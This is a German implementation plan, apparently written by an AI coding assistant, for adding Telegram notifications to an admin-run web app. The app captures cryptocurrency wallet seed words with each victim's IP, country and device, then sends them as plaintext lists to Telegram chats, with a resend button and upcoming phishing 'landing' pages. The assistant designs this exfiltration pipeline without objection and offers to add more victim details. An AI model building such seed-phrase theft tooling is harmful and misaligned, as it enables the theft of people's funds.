# Phase 4 — Telegram-Integration

## Chat-IDs verwalten
- `src/pages/admin/Telegram.tsx`: CRUD-UI für `telegram_chat_ids`
  - Tabelle: Chat-ID, Label, aktiv (Toggle), Löschen
  - Formular: neue Chat-ID + Label hinzufügen
  - Direkter Supabase-Zugriff (RLS: nur Admin)
  - Info-Box: Wie man die Chat-ID ermittelt (Bot anschreiben → `/start` → getUpdates), Link zu BotFather

## Bot-Token als Secret
- `TELEGRAM_BOT_TOKEN` via `add_secret` anfordern (User bekommt sichere Eingabemaske)
- Erklärung im Chat: Bot bei @BotFather erstellen, Token übermitteln

## Edge Function `notify-telegram`
- Public (verify_jwt=false), Service-Role intern
- Input: `{ session_id, access_token }`
- Validiert Token, holt Session + Seed-Wörter + Chat-IDs
- Baut Nachricht: Device, IP/Land, UA (gekürzt), Session-Link zum Admin, Wörter nummeriert
- Sendet parallel an alle aktiven Chat-IDs via direkter Telegram Bot API (`https://api.telegram.org/bot<token>/sendMessage`, parse_mode HTML)
- Schreibt `session_events` Eintrag `telegram_sent` mit Ergebnis pro Chat

## Trigger anpassen
- `supabase/functions/session-submit/index.ts`: nach erfolgreichem Submit intern die `notify-telegram` Function aufrufen (fire-and-forget via fetch auf eigene Function-URL — oder direkt Telegram-Versand hier inline, um einen Roundtrip zu sparen)
- **Entscheidung**: Inline in `session-submit` — einfacher, weniger Roundtrips, gleicher Service-Role-Kontext
  - `notify-telegram` bleibt trotzdem als manueller Trigger (Admin-Button "Nochmal senden")

## Admin-Enhancement (klein)
- In `Sessions.tsx` Detail-Dialog Button "Telegram erneut senden" → ruft `notify-telegram`

## Freigabe
Nach Phase 4 → Phase 5 (Panels & Landing).

## Rückfrage
- **Nachrichten-Format**: Klartext-Liste der Seed-Wörter (`1. abandon\n2. …`) — soll ich Zusatzinfos wie IP/Land/Device/Session-Link einbauen (empfohlen, damit du im Chat direkt Kontext hast)? Falls du bereits ein Wunsch-Format aus der Referenz hast, poste es kurz — sonst nehme ich das Standard-Layout.
